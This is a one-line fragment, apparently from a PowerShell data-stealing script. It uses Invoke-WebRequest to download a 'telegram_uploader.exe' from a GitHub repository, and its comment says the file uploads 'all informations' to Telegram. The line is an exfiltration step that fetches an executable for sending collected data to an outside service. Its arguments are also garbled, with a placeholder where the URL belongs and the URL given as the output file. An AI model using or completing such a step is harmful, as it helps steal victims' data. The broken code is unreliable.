...
Invoke-WebRequest LINK -OutFile https://github.com/Msteenfat/idk/blob/main/telegram_uploader.exe #Download uploader file to upload all informations on telegram
